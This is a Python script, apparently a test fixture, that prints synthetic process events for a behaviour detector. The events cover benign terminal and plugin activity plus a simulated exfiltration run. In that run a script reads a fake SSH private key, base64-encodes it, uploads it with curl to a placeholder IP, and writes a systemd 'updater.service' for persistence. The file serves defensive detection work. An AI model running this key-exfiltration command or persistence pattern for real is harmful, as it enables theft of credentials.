import json, sys, time
t = int(time.time() * 1000) - 60_000
H = "/home/iluxa"
out = []
def ev(dt, pid, comm, kind, **kw):
    out.append(dict(ts_ms=t + dt, pid=pid, tid=pid, uid=1000, comm=comm, cgroup=1, kind=kind, **kw))
FOOT, BASH, SCRIPT = 4100001, 4100002, 4100003
ev(0, FOOT, "foot", "exec", exe="/usr/bin/foot", argv=["foot"])
ev(1, FOOT, "foot", "fork", child=BASH)
ev(2, BASH, "bash", "exec", exe="/usr/bin/bash", argv=["/usr/bin/bash"])
# benign: ls in the terminal
ev(100, BASH, "bash", "fork", child=4100010)
ev(101, 4100010, "ls", "exec", exe="/usr/bin/ls", argv=["ls", "-la", H])
# fake-exfil
ev(1000, BASH, "bash", "fork", child=SCRIPT)
ev(1001, SCRIPT, "fake-exfil.sh", "exec", exe="./scripts/fake-exfil.sh", argv=["/usr/bin/env", "bash", "./scripts/fake-exfil.sh"])
ev(1002, SCRIPT, "bash", "exec", exe="/usr/bin/bash", argv=["bash", "./scripts/fake-exfil.sh"])
ev(1010, SCRIPT, "bash", "fork", child=4100004)
ev(1011, 4100004, "mktemp", "exec", exe="/usr/bin/mktemp", argv=["mktemp", "-d", "/tmp/dnom-test.XXXXXX"])
ev(1020, SCRIPT, "bash", "open", path="/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519", flags=577, write=True)
ev(1030, SCRIPT, "bash", "fork", child=4100005)
ev(1031, 4100005, "cat", "exec", exe="/usr/bin/cat", argv=["cat", "/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519"])
ev(1032, 4100005, "cat", "open", path="/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519", flags=0, write=False)
ev(1033, SCRIPT, "bash", "fork", child=4100006)
ev(1034, 4100006, "base64", "exec", exe="/usr/bin/base64", argv=["base64"])
ev(1035, 4100006, "base64", "open", path="/tmp/dnom-test.Ab12Cd/payload.txt", flags=577, write=True)
ev(1040, SCRIPT, "bash", "fork", child=4100007)
ev(1041, 4100007, "curl", "exec", exe="/usr/bin/curl", argv=["curl", "-s", "--connect-timeout", "2", "--data-binary", "@/tmp/dnom-test.Ab12Cd/payload.txt", "https://203.0.113.7/upload"])
ev(1042, 4100007, "curl", "open", path="/tmp/dnom-test.Ab12Cd/payload.txt", flags=0, write=False)
ev(1043, 4100007, "curl", "net", op="connect", dest="203.0.113.7:443")
ev(3100, SCRIPT, "bash", "open", path="/tmp/dnom-test.Ab12Cd/.config/systemd/user/updater.service", flags=577, write=True)
# ignored: omaestro plugin running hyprctl
QS, OM = 4100020, 4100021
ev(50, QS, "quickshell", "exec", exe="/usr/bin/quickshell", argv=["quickshell", "-n", "-p", "/usr/share/omarchy/shell"])
ev(51, QS, "quickshell", "fork", child=OM)
ev(52, OM, "om-0.1.8-x86_64", "exec", exe=H + "/.local/share/omaestro/om-0.1.8-x86_64", argv=[H + "/.local/share/omaestro/om-0.1.8-x86_64", "daemon"])
for i in range(5):
    ev(200 + i * 1000, OM, "om-0.1.8-x86_64", "fork", child=4100030 + i)
    ev(201 + i * 1000, 4100030 + i, "hyprctl", "exec", exe="/usr/bin/hyprctl", argv=["hyprctl", "activewindow", "-j"])
# trailing event so replay time passes the settle window
ev(20000, FOOT, "foot", "open", path="/home/iluxa/.config/foot/foot.ini", flags=0, write=False)
out.sort(key=lambda e: e["ts_ms"])
for e in out:
    print(json.dumps(e))
